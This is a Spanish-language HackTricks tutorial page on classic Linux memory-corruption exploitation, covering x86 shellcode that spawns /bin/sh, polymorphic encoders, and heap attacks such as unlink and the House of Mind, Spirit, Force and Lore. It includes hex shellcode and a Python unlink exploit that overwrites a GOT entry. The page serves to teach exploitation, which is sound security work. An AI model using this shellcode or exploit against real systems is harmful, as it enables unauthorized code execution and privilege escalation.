# Explotaci√≥n de Linux (B√°sico)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **2.SHELLCODE**

Ver interrupciones de kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; limpiamos eax\
xor ebx, ebx ; ebx = 0 pues no hay argumento que pasar\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Ejecutar syscall

**nasm -f elf assembly.asm** ‚Äî> Nos devuelve un .o\
**ld assembly.o -o shellcodeout** ‚Äî> Nos da un ejecutable formado por el c√≥digo ensamblador y podemos sacar los opcodes con **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para ver que efectivamente es nuestra shellcode y sacar los OpCodes

**Comprobar que la shellcode funciona**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Para confirmar que las llamadas al sistema se realizan correctamente, se debe compilar el programa anterior y las llamadas al sistema deben aparecer en **strace ./PROGRAMA\_COMPILADO**

Al crear shellcodes, se puede utilizar un truco. La primera instrucci√≥n es un salto a una llamada. La llamada ejecuta el c√≥digo original y tambi√©n coloca el EIP en la pila. Despu√©s de la instrucci√≥n de llamada, hemos colocado la cadena que necesitamos, por lo que con ese EIP podemos apuntar a la cadena y continuar ejecutando el c√≥digo.

EJ **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ usando el Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Buscador de Egg:**

Es un peque√±o c√≥digo que recorre las p√°ginas de memoria asociadas a un proceso en busca de la shellcode guardada all√≠ (busca alguna firma espec√≠fica en la shellcode). √ötil en casos donde solo hay un espacio limitado para inyectar c√≥digo.

**Shellcodes Polim√≥rficos**

Son shells cifrados que contienen un peque√±o c√≥digo para descifrarlos y saltar a √©l, utilizando el truco de Call-Pop. Un **ejemplo ser√≠a un cifrado C√©sar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5. M√©todos complementarios**

**T√©cnica de Murat**

En Linux, todos los programas se mapean comenzando en 0xbfffffff.

Al observar c√≥mo se construye la pila de un nuevo proceso en Linux, se puede desarrollar un exploit de manera que el programa se inicie en un entorno donde la √∫nica variable sea la shellcode. La direcci√≥n de esta variable se puede calcular como: addr = 0xbfffffff - 4 - strlen(NOMBRE_ejecutable_completo) - strlen(shellcode).

De esta forma, se puede obtener de manera sencilla la direcci√≥n donde se encuentra la variable de entorno con la shellcode.

Esto es posible gracias a que la funci√≥n execle permite crear un entorno que solo contenga las variables de entorno deseadas.

### **Format Strings to Buffer Overflows**

La funci√≥n **sprintf** mueve una cadena formateada a una variable. Por lo tanto, se podr√≠a abusar del formateo de una cadena para causar un desbordamiento de b√∫fer en la variable donde se copia el contenido. Por ejemplo, la carga √∫til `%.44xAAAA` escribir√° 44B+"AAAA" en la variable, lo que puede causar un desbordamiento de b√∫fer.

### **Estructuras \_\_atexit**

{% hint style="danger" %}
Hoy en d√≠a es muy raro explotar esto.
{% endhint %}

`atexit()` es una funci√≥n a la que se le pasan otras funciones como par√°metros. Estas funciones se ejecutar√°n al ejecutar un `exit()` o al retornar del `main`. Si se puede modificar la direcci√≥n de alguna de estas funciones para que apunte a una shellcode, por ejemplo, se obtendr√° el control del proceso, pero actualmente esto es m√°s complicado. Actualmente, las direcciones de las funciones a ejecutar est√°n ocultas detr√°s de varias estructuras y, finalmente, la direcci√≥n a la que apuntan no son las direcciones de las funciones, sino que est√°n encriptadas con XOR y desplazamientos con una clave aleatoria. Por lo tanto, actualmente este vector de ataque no es muy √∫til, al menos en x86 y x64_86. La funci√≥n de encriptaci√≥n es `PTR_MANGLE`. Otras arquitecturas como m68k, mips32, mips64, aarch64, arm, hppa... no implementan la funci√≥n de encriptaci√≥n porque devuelve lo mismo que recibe como entrada. Por lo tanto, estas arquitecturas podr√≠an ser atacadas por este vector.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Hoy en d√≠a es muy raro explotar esto.
{% endhint %}

`Setjmp()` permite guardar el contexto (los registros). `longjmp()` permite restaurar el contexto. Los registros guardados son: `EBX, ESI, EDI, ESP, EIP, EBP`. Lo que sucede es que EIP y ESP son pasados por la funci√≥n `PTR_MANGLE`, por lo que las arquitecturas vulnerables a este ataque son las mismas que se mencionaron anteriormente. Son √∫tiles para la recuperaci√≥n de errores o interrupciones. Sin embargo, por lo que he le√≠do, los otros registros no est√°n protegidos, por lo que si hay un `call ebx`, `call esi` o `call edi` dentro de la funci√≥n llamada, se puede tomar el control. Tambi√©n se podr√≠a modificar EBP para modificar ESP.

### **VTable y VPTR en C++**

Cada clase tiene una Vtable que es un array de punteros a m√©todos.

Cada objeto de una clase tiene un VPtr que es un puntero al array de su clase. El VPtr es parte del encabezado de cada objeto, por lo que si se logra sobrescribir el VPtr, se podr√≠a modificar para que apunte a un m√©todo ficticio, de modo que al ejecutar una funci√≥n se dirija a la shellcode.

## **Medidas preventivas y evasiones**

### **Reemplazo de Libsafe**

Se activa con: LD_PRELOAD=/lib/libsafe.so.2 o "/lib/libsave.so.2" > /etc/ld.so.preload

Intercepta las llamadas a algunas funciones inseguras por otras seguras. No est√° estandarizado (solo para x86, no para compilaciones con -fomit-frame-pointer, no para compilaciones est√°ticas, no todas las funciones vulnerables se vuelven seguras y LD_PRELOAD no funciona en binarios con suid).

### **Espacio de direcciones ASCII Armored**

Consiste en cargar las librer√≠as compartidas de 0x00000000 a 0x00ffffff para que siempre haya un byte 0x00. Sin embargo, esto realmente no detiene casi ning√∫n ataque, y menos en little endian.

### **ret2plt**

Consiste en realizar un ROP de manera que se llame a la funci√≥n strcpy@plt (de la plt) y se apunte a la entrada de la GOT y se copie el primer byte de la funci√≥n a la que se quiere llamar (system()). Acto seguido se hace lo mismo apuntando a GOT+1 y se copia el 2¬∫ byte de system()... Al final se llama la direcci√≥n guardada en GOT que ser√° system().

### **Jaulas con chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Instala un sistema b√°sico bajo un subdirectorio espec√≠fico

Un administrador puede salir de una de estas jaulas haciendo: mkdir foo; chroot foo; cd ..

### **Instrumentaci√≥n de c√≥digo**

Valgrind ‚Äî> Busca errores Memcheck RAD (Return Address Defender) Insure++

## **8 Heap Overflows: Exploits b√°sicos**

**Trozo asignado**

prev_size | size | ‚ÄîCabecera \*mem | Datos

**Trozo libre**

prev_size | size | \*fd | Ptr forward chunk \*bk | Ptr back chunk ‚ÄîCabecera \*mem | Datos

Los trozos libres est√°n en una lista doblemente enlazada (bin) y nunca pueden haber dos trozos libres juntos (se juntan).

En "size" hay bits para indicar: si el trozo anterior est√° en uso, si el trozo ha sido asignado mediante mmap() y si el trozo pertenece al arena primario.

Si al liberar un trozo alguno de los contiguos se encuentra libre, estos se fusionan mediante la macro unlink() y se pasa el nuevo trozo m√°s grande a frontlink() para que le inserte en el bin adecuado.

unlink(){ BK = P->bk; ‚Äî> El BK del nuevo chunk es el que tuviese el que ya estaba libre antes FD = P->fd; ‚Äî> El FD del nuevo chunk es el que tuviese el que ya estaba libre antes FD->bk = BK; ‚Äî> El BK del siguiente chunk apunta al nuevo chunk BK->fd = FD; ‚Äî> El FD del anterior chunk apunta al nuevo chunk }

Por lo tanto, si logramos modificar P->bk con la direcci√≥n de una shellcode y P->fd con la direcci√≥n de una entrada en la GOT o DTORS menos 12, se logra:

BK = P->bk = &shellcode FD = P->fd = &__dtor_end__ - 12 FD->bk = BK -> *((&__dtor_end__ - 12) + 12) = &shellcode

Y as√≠, al salir del programa, se ejecutar√° la shellcode.

Adem√°s, la cuarta sentencia de unlink() escribe algo y la shellcode debe estar preparada para esto:

BK->fd = FD -> *(&shellcode + 8) = (&__dtor_end__ - 12) ‚Äî> Esto provoca la escritura de 4 bytes a partir del 8¬∫ byte de la shellcode, por lo que la primera instrucci√≥n de la shellcode debe ser un jmp para saltar esto y caer en unos nops que lleven al resto de la shellcode.

Por lo tanto, el exploit se crea:

En el buffer1 se inserta la shellcode comenzando con un jmp para que caiga en los nops o en el resto de la shellcode.

Despu√©s de la shellcode, se inserta relleno hasta llegar al campo prev_size y size del siguiente trozo. En estos lugares se inserta 0xfffffff0 (para sobrescribir prev_size y marcarlo como libre) y "-4" (0xfffffffc) en size (para que al comprobar en el tercer trozo si el segundo estaba libre, en realidad vaya al prev_size modificado que indicar√° que est√° libre) -> As√≠, cuando free() investigue, ir√° al size del tercer trozo pero en realidad ir√° al segundo - 4 y pensar√° que el segundo trozo est√° libre. Entonces, llamar√° a **unlink()**.
Al calling unlink() se usar√° P->fd los primeros datos del 2¬∫ trozo por lo que ah√≠ se meter√° la direcci√≥n que se quieres sobreescribir - 12(pues en FD->bk le sumar√° 12 a la direcci√≥n guardada en FD) . Y en esa direcci√≥n introducir√° la segunda direcci√≥n que encuentre en el 2¬∫ trozo, que nos interesar√° que sea la direcci√≥n a la shellcode(P->bk falso).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo est√° libre est√© a 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que piense que el ‚Äúsize‚Äù del 3¬∫ trozo est√° 4bytes detr√°s (apunta a prev\_size) pues es ah√≠ donde mira si el 2¬∫ trozo est√° libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Direcci√≥n de free() en la plt-12 (ser√° la direcci√≥n que se sobrescrita para que se lanza la shellcode la 2¬∫ vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque s√≠**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2¬∫ trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Estamos controlando 3 chunks consecutivos y se liberan en orden inverso al reservado.

En ese caso:

En el chunck c se pone el shellcode

El chunck a lo usamos para sobreescribir el b de forma que el el size tenga el bit PREV\_INUSE desactivado de forma que piense que el chunck a est√° libre.

Adem√°s, se sobreescribe en la cabecera b el size para que valga -4.

Entonces, el programa se pensar√° que ‚Äúa‚Äù est√° libre y en un bin, por lo que llamar√° a unlink() para desenlazarlo. Sin embargo, como la cabecera PREV\_SIZE vale -4. Se pensar√° que el trozo de ‚Äúa‚Äù realmente empieza en b+4. Es decir, har√° un unlink() a un trozo que comienza en b+4, por lo que en b+12 estar√° el puntero ‚Äúfd‚Äù y en b+16 estar√° el puntero ‚Äúbk‚Äù.

De esta forma, si en bk ponemos la direcci√≥n a la shellcode y en fd ponemos la direcci√≥n a la funci√≥n ‚Äúputs()‚Äù-12 tenemos nuestro payload.

**T√©cnica de Frontlink**

Se llama a frontlink cuando se libera algo y ninguno de sus trozos contiguos no son libres, no se llama a unlink() sino que se llama directamente a frontlink().

Vulnerabilidad √∫til cuando el malloc que se ataca nunca es liberado (free()).

Necesita:

Un buffer que pueda desbordarse con la funci√≥n de entrada de datos

Un buffer contiguo a este que debe ser liberado y al que se le modificar√° el campo fd de su cabecera gracias al desbordamiento del buffer anterior

Un buffer a liberar con un tama√±o mayor a 512 pero menor que el buffer anterior

Un buffer declarado antes del paso 3 que permita sobreescribir el prev\_size de este

De esta forma logrando sobres cribar en dos mallocs de forma descontrolada y en uno de forma controlada pero que solo se libera ese uno, podemos hacer un exploit.

**Vulnerabilidad double free()**

Si se llama dos veces a free() con el mismo puntero, quedan dos bins apuntando a la misma direcci√≥n.

En caso de querer volver a usar uno se asignar√≠a sin problemas. En caso de querer usar otro, se le asignar√≠a el mismo espacio por lo que tendr√≠amos los punteros ‚Äúfd‚Äù y ‚Äúbk‚Äù falseados con los datos que escribir√° la reserva anterior.

**After free()**

Un puntero previamente liberado es usado de nuevo sin control.

## **8 Heap Overflows: Exploits avanzados**

Las t√©cnicas de Unlink() y FrontLink() fueron eliminadas al modificar la funci√≥n unlink().

**The house of mind**

Solo una llamada a free() es necesaria para provocar la ejecuci√≥n de c√≥digo arbitrario. Interesa buscar un segundo trozo que puede ser desbordado por uno anterior y liberado.

Una llamada a free() provoca llamar a public\_fREe(mem), este hace:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Devuelve un puntero a la direcci√≥n donde comienza el trozo (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

En \[1] comprueba el campo size el bit NON\_MAIN\_ARENA, el cual se puede alterar para que la comprobaci√≥n devuelva true y ejecute heap\_for\_ptr() que hace un and a ‚Äúmem‚Äù dejando a 0 los 2.5 bytes menos importantes (en nuestro caso de 0x0804a000 deja 0x08000000) y accede a 0x08000000->ar\_ptr (como si fuese un struct heap\_info)

De esta forma si podemos controlar un trozo por ejemplo en 0x0804a000 y se va a liberar un trozo en **0x081002a0** podemos llegar a la direcci√≥n 0x08100000 y escribir lo que queramos, por ejemplo **0x0804a000**. Cuando este segundo trozo se libere se encontrar√° que heap\_for\_ptr(ptr)->ar\_ptr devuelve lo que hemos escrito en 0x08100000 (pues se aplica a 0x081002a0 el and que vimos antes y de ah√≠ se saca el valor de los 4 primeros bytes, el ar\_ptr)

De esta forma se llama a \_int\_free(ar\_ptr, mem), es decir, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Como hemos visto antes podemos controlar el valor de av, pues es lo que escribimos en el trozo que se va a liberar.

Tal y como se define unsorted\_chunks, sabemos que:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Por lo tanto si en av->bins\[2] escribimos el valor de \_\_DTOR\_END\_\_-12 en la √∫ltima instrucci√≥n se escribir√° en \_\_DTOR\_END\_\_ la direcci√≥n del segundo trozo.

Es decir, en el primer trozo tenemos que poner al inicio muchas veces la direcci√≥n de \_\_DTOR\_END\_\_-12 porque de ah√≠ la sacar√° av->bins\[2]

En la direcci√≥n que caiga la direcci√≥n del segundo trozo con los √∫ltimos 5 ceros hay que escribir la direcci√≥n a este primer trozo para que heap\_for\_ptr() piense que el ar\_ptr est√° al inicio del primer trozo y saque de ah√≠ el av->bins\[2]
En el segundo fragmento y gracias al primero sobreescribimos el prev\_size con un jump 0x0c y el size con algo para activar -> NON\_MAIN\_ARENA

A continuaci√≥n en el fragmento 2 ponemos un mont√≥n de nops y finalmente la shellcode

De esta forma se llamar√° a \_int\_free(TROZO1, TROZO2) y seguir√° las instrucciones para escribir en \_\_DTOR\_END\_\_ la direcci√≥n del prev\_size del TROZO2 el cual saltar√° a la shellcode.

Para aplicar esta t√©cnica hace falta que se cumplan algunos requerimientos m√°s que complican un poco m√°s el payload.

Esta t√©cnica ya no es aplicable pues se aplic√≥ casi el mismo parche que para unlink. Se comparan si el nuevo sitio al que se apunta tambi√©n le est√° apuntando a √©l.

**Fastbin**

Es una variante de The house of mind

nos interesa llegar a ejecutar el siguiente c√≥digo al cu√°l se llega pasada la primera comprobaci√≥n de la funci√≥n \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Siendo fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

De esta forma si se pone en ‚Äúfb‚Äù da direcci√≥n de una funci√≥n en la GOT, en esta direcci√≥n se pondr√° la direcci√≥n al trozo sobrescrito. Para esto ser√° necesario que la arena est√© cerca de las direcciones de dtors. M√°s exactamente que av->max\_fast est√© en la direcci√≥n que vamos a sobreescribir.

Dado que con The House of Mind se vio que nosotros control√°bamos la posici√≥n del av.

Entones si en el campo size ponemos un tama√±o de 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() nos devolver√° fastbins\[-1], que apuntar√° a av->max\_fast

En este caso av->max\_fast ser√° la direcci√≥n que se sobrescrita (no a la que apunte, sino esa posici√≥n ser√° la que se sobrescrita).

Adem√°s se tiene que cumplir que el trozo contiguo al liberado debe ser mayor que 8 -> Dado que hemos dicho que el size del trozo liberado es 8, en este trozo falso solo tenemos que poner un size mayor que 8 (como adem√°s la shellcode ir√° en el trozo liberado, habr√° que poner al ppio un jmp que caiga en nops).

Adem√°s, ese mismo trozo falso debe ser menor que av->system\_mem. av->system\_mem se encuentra 1848 bytes m√°s all√°.

Por culpa de los nulos de \_DTOR\_END\_ y de las pocas direcciones en la GOT, ninguna direcci√≥n de estas secciones sirven para ser sobrescritas, as√≠ que veamos como aplicar fastbin para atacar la pila.

Otra forma de ataque es redirigir el **av** hacia la pila.

Si modificamos el size para que de 16 en vez de 8 entonces: fastbin\_index() nos devolver√° fastbins\[0] y podemos hacer uso de esto para sobreescribir la pila.

Para esto no debe haber ning√∫n canary ni valores raros en la pila, de hecho tenemos que encontrarnos en esta: 4bytes nulos + EBP + RET

Los 4 bytes nulo se necesitan que el **av** estar√° a esta direcci√≥n y el primero elemento de un **av** es el mutexe que tiene que valer 0.

El **av->max\_fast** ser√° el EBP y ser√° un valor que nos servir√° para saltarnos las restricciones.

En el **av->fastbins\[0]** se sobreescribir√° con la direcci√≥n de **p** y ser√° el RET, as√≠ se saltar√° a la shellcode.

Adem√°s, en **av->system\_mem** (1484bytes por encima de la posici√≥n en la pila) habr√° bastante basura que nos permitir√° saltarnos la comprobaci√≥n que se realiza.

Adem√°s se tiene que cumplir que el trozo contiguo al liberado debe ser mayor que 8 -> Dado que hemos dicho que el size del trozo liberado es 16, en este trozo falso solo tenemos que poner un size mayor que 8 (como adem√°s la shellcode ir√° en el trozo liberado, habr√° que poner al ppio un jmp que caiga en nops que van despu√©s del campo size del nuevo trozo falso).

**The House of Spirit**

En este caso buscamos tener un puntero a un malloc que pueda ser alterable por el atacante (por ej, que el puntero est√© en el stack debajo de un posible overflow a una variable).

As√≠, podr√≠amos hacer que este puntero apuntase a donde fuese. Sin embargo, no cualquier sitio es v√°lido, el tama√±o del trozo falseado debe ser menor que av->max\_fast y m√°s espec√≠ficamente igual al tama√±o solicitado en una futura llamada a malloc()+8. Por ello, si sabemos que despu√©s de este puntero vulnerable se llama a malloc(40), el tama√±o del trozo falso debe ser igual a 48.

Si por ejemplo el programa preguntase al usuario por un n√∫mero podr√≠amos introducir 48 y apuntar el puntero de malloc modificable a los siguientes 4bytes (que podr√≠an pertenecer al EBP con suerte, as√≠ el 48 queda por detr√°s, como si fuese la cabecera size). Adem√°s, la direcci√≥n ptr-4+48 debe cumplir varias condiciones (siendo en este caso ptr=EBP), es decir, 8 < ptr-4+48 < av->system\_mem.

En caso de que esto se cumpla, cuando se llame al siguiente malloc que dijimos que era malloc(40) se le asignar√° como direcci√≥n la direcci√≥n del EBP. En caso de que el atacante tambi√©n pueda controlar lo que se escribe en este malloc puede sobreescribir tanto el EBP como el EIP con la direcci√≥n que quiera.

Esto creo que es porque as√≠ cuando lo libere free() guardar√° que en la direcci√≥n que apunta al EBP del stack hay un trozo de tama√±o perfecto para el nuevo malloc() que se quiere reservar, as√≠ que le asigna esa direcci√≥n.

**The House of Force**

Es necesario:

* Un overflow a un trozo que permita sobreescribir el wilderness
* Una llamada a malloc() con el tama√±o definido por el usuario
* Una llamada a malloc() cuyos datos puedan ser definidos por el usuario

Lo primero que se hace es sobreescribir el size del trozo wilderness con un valor muy grande (0xffffffff), as√≠ cualquiera solicitud de memoria lo suficientemente grande ser√° tratada en \_int\_malloc() sin necesidad de expandir el heap

Lo segundo es alterar el av->top para que apunte a una zona de memoria bajo el control del atacante, como el stack. En av->top se pondr√° \&EIP - 8.

Tenemos que sobreescrbir av->top para que apunte a la zona de memoria bajo el control del atacante:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim recoge el valor de la direcci√≥n del trozo wilderness actual (el actual av->top) y remainder es exactamente la suma de esa direcci√≥n m√°s la cantidad de bytes solicitados por malloc(). Por lo que si \&EIP-8 est√° en 0xbffff224 y av->top contiene 0x080c2788, entonces la cantidad que tenemos que reservar en el malloc controlado para que av->top quede apuntando a $EIP-8 para el pr√≥ximo malloc() ser√°:

0xbffff224 - 0x080c2788 = 3086207644.

As√≠ se guardar√° en av->top el valor alterado y el pr√≥ximo malloc apuntar√° al EIP y lo podr√° sobreescribir.

Es importante saber que el size del nuevo trozo wilderness sea m√°s grande que la solicitud realizada por el √∫ltimo malloc(). Es decir, si el wilderness est√° apuntando a \&EIP-8, el size quedar√° justo en el campo EBP del stack.

**The House of Lore**

**Corrupci√≥n SmallBin**

Los trozos liberados se introducen en el bin en funci√≥n de su tama√±o. Pero antes de introduciros se guardan en unsorted bins. Un trozo es liberado no se mete inmediatamente en su bin sino que se queda en unsorted bins. A continuaci√≥n, si se reserva un nuevo trozo y el anterior liberado le puede servir se lo devuelve, pero si se reserva m√°s grande, el trozo liberado en unsorted bins se mete en su bin adecuado.

Para alcanzar el c√≥digo vulnerable la solicitud de memora deber√° ser mayor a av->max\_fast (72normalmente) y menos a MIN\_LARGE\_SIZE (512).
Si en los bin hay un trozo del tama√±o adecuado a lo que se pide se devuelve ese despu√©s de desenlazarlo:

bck = victim->bk; Apunta al trozo anterior, es la √∫nica info que podemos alterar.

bin->bk = bck; El pen√∫ltimo trozo pasa a ser el √∫ltimo, en caso de que bck apunte al stack al siguiente trozo reservado se le dar√° esta direcci√≥n

bck->fd = bin; Se cierra la lista haciendo que este apunte a bin

Se necesita:

Que se reserven dos malloc, de forma que al primero se le pueda hacer overflow despu√©s de que el segundo haya sido liberado e introducido en su bin (es decir, se haya reservado un malloc superior al segundo trozo antes de hacer el overflow)

Que el malloc reservado al que se le da la direcci√≥n elegida por el atacante sea controlada por el atacante.

El objetivo es el siguiente, si podemos hacer un overflow a un heap que tiene por debajo un trozo ya liberado y en su bin, podemos alterar su puntero bk. Si alteramos su puntero bk y este trozo llega a ser el primero de la lista de bin y se reserva, a bin se le enga√±ar√° y se le dir√° que el √∫ltimo trozo de la lista (el siguiente en ofrecer) est√° en la direcci√≥n falsa que hayamos puesto (al stack o GOT por ejemplo). Por lo que si se vuelve a reservar otro trozo y el atacante tiene permisos en √©l, se le dar√° un trozo en la posici√≥n deseada y podr√° escribir en ella.

Tras liberar el trozo modificado es necesario que se reserve un trozo mayor al liberado, as√≠ el trozo modificado saldr√° de unsorted bins y se introducir√≠a en su bin.

Una vez en su bin es el momento de modificarle el puntero bk mediante el overflow para que apunte a la direcci√≥n que queramos sobreescribir.

As√≠ el bin deber√° esperar turno a que se llame a malloc() suficientes veces como para que se vuelva a utilizar el bin modificado y enga√±e a bin haci√©ndole creer que el siguiente trozo est√° en la direcci√≥n falsa. Y a continuaci√≥n se dar√° el trozo que nos interesa.

Para que se ejecute la vulnerabilidad lo antes posible lo ideal ser√≠a: Reserva del trozo vulnerable, reserva del trozo que se modificar√°, se libera este trozo, se reserva un trozo m√°s grande al que se modificar√°, se modifica el trozo (vulnerabilidad), se reserva un trozo de igual tama√±o al vulnerado y se reserva un segundo trozo de igual tama√±o y este ser√° el que apunte a la direcci√≥n elegida.

Para proteger este ataque se uso la t√≠pica comprobaci√≥n de que el trozo ‚Äúno‚Äù es falso: se comprueba si bck->fd est√° apuntando a victim. Es decir, en nuestro caso si el puntero fd\* del trozo falso apuntado en el stack est√° apuntando a victim. Para sobrepasar esta protecci√≥n el atacante deber√≠a ser capaz de escribir de alguna forma (por el stack probablemente) en la direcci√≥n adecuada la direcci√≥n de victim. Para que as√≠ parezca un trozo verdadero.

**Corrupci√≥n LargeBin**

Se necesitan los mismos requisitos que antes y alguno m√°s, adem√°s los trozos reservados deben ser mayores a 512.

El ataque es como el anterior, es decir, ha que modificar el puntero bk y se necesitan todas esas llamadas a malloc(), pero adem√°s hay que modificar el size del trozo modificado de forma que ese size - nb sea < MINSIZE.

Por ejemplo har√° que poner en size 1552 para que 1552 - 1544 = 8 < MINSIZE (la resta no puede quedar negativa porque se compara un unsigned)

Adem√°s se ha introducido un parche para hacerlo a√∫n m√°s complicado.

**Heap Spraying**

B√°sicamente consiste en reservar tooda la memoria posible para heaps y rellenar estos con un colch√≥n de nops acabados por una shellcode. Adem√°s, como colch√≥n se utiliza 0x0c. Pues se intentar√° saltar a la direcci√≥n 0x0c0c0c0c, y as√≠ si se sobreescribe alguna direcci√≥n a la que se vaya a llamar con este colch√≥n se saltar√° all√≠. B√°sicamente la t√°ctica es reservar lo m√°ximos posible para ver si se sobreescribe alg√∫n puntero y saltar a 0x0c0c0c0c esperando que all√≠ haya nops.

**Heap Feng Shui**

Consiste en mediante reservas y liberaciones sementar la memoria de forma que queden trozos reservados entre medias de trozos libres. El buffer a desbordar se situar√° en uno de los huevos.

**objdump -d ejecutable** ‚Äî> Disas functions\
**objdump -d ./PROGRAMA | grep FUNCION** ‚Äî> Get function address\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para ver que efectivamente es nuestra shellcode y sacar los OpCodes\
**objdump -t ./exec | grep varBss** ‚Äî> Tabla de s√≠mbolos, para sacar address de variables y funciones\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Para sacar address de funciones de librer√≠as (GOT)\
**objdump -d ./exec | grep funcCode**\
